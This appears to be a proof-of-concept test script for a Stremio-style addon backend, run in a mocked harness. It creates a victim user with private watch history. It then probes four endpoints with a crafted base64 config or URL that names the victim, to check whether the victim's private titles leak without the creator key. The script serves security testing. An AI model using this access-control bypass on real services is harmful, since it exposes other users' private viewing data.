import { makeEnv, makeKv, makeD1, call, createUser } from "../../tests/harness.mjs";
const env = makeEnv({ CONFIGS: makeKv(), DB: makeD1() });
const victim = await createUser(env, "victimuser");
await call(env, "/api/creator/sync/save-tracking", { method: "POST", json: {
  creatorName: "victimuser", creatorKey: victim.creatorKey,
  watchHistory: [{ id: "tt7654321:1:1", showId: "tt7654321", showTitle: "A Private Show", seasonNum: 1, episodeNum: 1, watchedAt: 111 }],
  continueWatching: [{ id: "tt7654321:1:2", showId: "tt7654321", name: "Ep 2", showTitle: "A Private Show", seasonNum: 1, episodeNum: 2 }],
  watchlist: [{ id: "tt0000009", name: "Something Embarrassing" }],
}});

const b64 = (o) => Buffer.from(JSON.stringify(o), "utf8").toString("base64").replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');

// Variant A: raw base64 config, no /api/save at all
const cfgA = b64({ entries: [{ id: "wh", name: "WH", type: "series", url: "autotrack:watch-history:series:victimuser" }] });
let r = await call(env, "/api/resolve?config=" + cfgA);
console.log("A /api/resolve base64 ->", r.status, "watchHistory:", JSON.stringify((r.body||{}).watchHistory));

// Variant B: the Stremio catalog route with a raw base64 config
r = await call(env, "/" + cfgA + "/catalog/series/wh.json");
console.log("B catalog base64 ->", r.status, "metas:", JSON.stringify((r.body||{}).metas || []).slice(0,220));

// Variant C: the /:config/configure page (does it render the victim's data?)
r = await call(env, "/" + cfgA + "/configure");
const txt = String(r.text||"");
console.log("C /configure base64 ->", r.status, "leaks 'A Private Show':", txt.includes("A Private Show"), "leaks 'Something Embarrassing':", txt.includes("Something Embarrassing"));

// Variant D: /api/preview
r = await call(env, "/api/preview?url=" + encodeURIComponent("autotrack:watch-history:series:victimuser") + "&type=series");
console.log("D /api/preview ->", r.status, JSON.stringify(r.body).slice(0,300));
